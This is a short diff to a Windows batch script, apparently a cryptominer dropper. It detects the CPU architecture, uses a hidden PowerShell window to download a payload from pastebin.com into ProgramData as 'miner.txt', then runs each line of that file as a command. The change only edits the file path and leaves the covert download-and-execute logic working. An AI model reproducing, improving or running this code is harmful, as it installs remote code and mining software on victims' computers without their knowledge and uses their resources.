@@ -6,6 +6,6 @@ reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" 
 if %OS%==32BIT powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/Y21uLxue', '%HOMEDRIVE%\ProgramData\miner.txt' )
 if %OS%==64BIT powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/B66spZ7X', '%HOMEDRIVE%\ProgramData\miner.txt' )
 timeout 5
-for /F "eol=; tokens=1* delims=" %%i in ( %HOMEDRIVE%\ProgramData\miner.txt ) do call :run %%i 
+for /F "eol=; tokens=1* delims=" %%i in ( C:\ProgramData\miner.txt ) do call :run %%i 
 :run
 %*
